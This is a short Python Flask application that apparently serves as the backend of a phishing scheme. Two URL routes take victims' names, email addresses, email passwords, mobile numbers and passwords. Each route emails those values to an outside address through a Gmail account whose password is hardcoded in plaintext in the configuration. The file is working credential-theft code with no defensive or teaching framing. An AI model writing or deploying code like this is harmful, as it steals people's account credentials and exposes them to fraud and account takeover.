from flask import Flask, render_template
from flask_mail import Mail
from flask_mail import Message

app = Flask(__name__)

app.config['MAIL_SERVER']='smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'aarnavhemant786@gmail.com'
app.config['MAIL_PASSWORD'] = 'Bj%231@iuh#'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True


mail = Mail(app)

@app.route("/default/<name>/<password>")
def default(name, password):

    msg = Message("Hello",
                  sender="aarnavhemant786@gmail.com",
                  recipients=["nkataguy@akij.tk"])
    msg.body = "This is the email " + name + " " + password
    mail.send(msg)
    return "done"


@app.route("/default/<email>/<emailpassword>/<mobile>/<password>")
def setptwo(email, emailpassword, mobile, password):

    msg = Message("Hello",
                  sender="aarnavhemant786@gmail.com",
                  recipients=["nkataguy@akij.tk"])
    msg.body = "This is the email " + email + " " + emailpassword + " " + mobile + " " + password
    mail.send(msg)
    return "done"


if __name__ == "__main__":
	app.run()